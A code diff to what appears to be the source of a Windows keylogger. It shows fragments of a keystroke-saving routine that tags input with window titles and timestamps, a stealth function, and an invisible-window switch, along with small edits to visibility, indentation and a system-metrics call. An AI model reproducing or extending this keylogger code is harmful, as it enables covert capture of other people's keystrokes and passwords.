@@ -10,7 +10,7 @@
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
-#define invisible // (visible / invisible)
+#define visible // (visible / invisible)
 // Defines whether you want to enable or disable 
 // boot time waiting if running at system boot.
 #define bootwait // (bootwait / nowait)
@@ -141,9 +141,9 @@ int Save(int key_stroke)
 
 		if (strcmp(window_title, lastwindow) != 0)
 		{
-		    strcpy_s(lastwindow, sizeof(lastwindow), window_title);
+			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
 			char s[64];
-		    strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
+			strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
 			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
 		}
 	}
@@ -214,8 +214,9 @@ void Stealth()
 // Function to check if the system is still booting up
 bool IsSystemBooting() 
 {
-//	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
-	return GetSystemMetrics(0x2004) != 0;
+// A workaround fix for missing definition of SM_SYSTEMDOCKED
+//	return GetSystemMetrics(0x2004) != 0;
+	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
 }
 
 int main()
